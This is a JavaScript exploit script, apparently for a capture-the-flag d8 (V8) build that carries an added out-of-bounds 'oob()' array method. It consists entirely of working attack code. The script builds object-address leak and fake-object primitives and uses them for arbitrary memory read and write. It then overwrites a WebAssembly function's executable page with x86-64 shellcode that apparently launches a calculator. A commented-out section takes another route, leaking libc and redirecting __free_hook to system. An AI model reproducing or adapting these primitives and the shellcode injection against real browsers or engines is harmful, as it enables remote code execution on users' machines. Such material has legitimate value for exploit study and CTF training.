var buff_area = new ArrayBuffer(0x10);
var fl = new Float64Array(buff_area);
var ui = new BigUint64Array(buff_area);
var obj = {"A":1};
var obj_fake_arr = [obj];
var fake_array_all = [1.1,2,3];
var luckyu = [1,2,3,4]
var obj_map = obj_fake_arr.oob();
var float_fake_array_map = fake_array_all.oob();
function ftoi(floo)
{    
    fl[0] = floo;    
    return ui[0];
}
function itof(infake_arr)
{    
    ui[0] = infake_arr;    
    return fl[0];
}
function hex(data)
{    
    return "0x"+data.toString(16);
}
function leak_obj(fake_arr){                //泄漏对象地址
    obj_fake_arr[0] = fake_arr;
    obj_fake_arr.oob(float_fake_array_map);
    let leak_obj_addr = obj_fake_arr[0];
    obj_fake_arr.oob(obj_map);
    return ftoi(leak_obj_addr);
}

function fake_obj(fake_arr){                //构造地址对象
    fake_array_all[0] = itof(fake_arr);
    fake_array_all.oob(obj_map);
    let fake_obj_addr = fake_array_all[0];
    fake_array_all.oob(float_fake_array_map);
    return fake_obj_addr;
}
function write(addr,data){
    let r = fake_obj(leak_obj(fake_arr)-0x20n);
    fake_arr[2] = itof(addr-0x10n);
    r[0] = itof(data);
}

function read(addr){
    let w = fake_obj(leak_obj(fake_arr)-0x20n);
    fake_arr[2] = itof(addr-0x10n);
    return ftoi(w[0]);
}

var fake_arr = [float_fake_array_map,1.1,2.2,3.3];
/*
var code = read_all(leak_obj(obj.constructor)-0x1n+0x30n)>>8n;
//console.log(hex(leak_obj(obj.constructor)-0x1n+0x30n));
//console.log(hex(code-1n+0x40n));
var d8Leak = read_all(code+0x40n)>>16n;
//console.log("[*] d8 leak : " + hex(d8Leak));
var d8Base = d8Leak - 0xfbbd60n;
alert(hex(d8Base));
//console.log("[*] d8 base : " + hex(d8Base));
got = d8Base + 0x00000000126d7a0n;
libc_base = (read_all(got) >> 8n) - 137904n;
//console.log(hex(libc_base));
alert(hex(libc_base));
free_hook = libc_base +4118760n;
//console.log(hex(free_hook));
system = libc_base+324672n;
function write_dataview(fake_addr,fake_data){
    let buff_new = new fake_arrayBuffer(0x30);
    let dataview = new DataView(buff_new);
    let leak_buff = leak_obj(buff_new);
    let fake_write = leak_buff+0x20n;
    write(fake_write,fake_addr);
    dataview.setBigUint64(0,fake_data,true);
}
write_dataview(free_hook, system);

function pwn()
{
    let cmd = "gnome-calculator\x00";
}
pwn();  
write_dataview(free_hook, 0x0n); 
*/
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var ex = wasmInstance.exports.main;
var leak_ex = leak_obj(ex);


var data1 = read(leak_ex+0x18n);
var data2 = read(data1+0x8n);
var data3 = read(data2+0x10n);
var data4 = read(data3+0x88n);

let buffer = new ArrayBuffer(0x100);
let dataview = new DataView(buffer);
let leak_buff = leak_obj(buffer);
let fake_write = leak_buff+0x20n;
write(fake_write,data4);
var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

for(var i=0;i<shellcode.length;i++){
    dataview.setUint32(4*i,shellcode[i],true);
}


ex();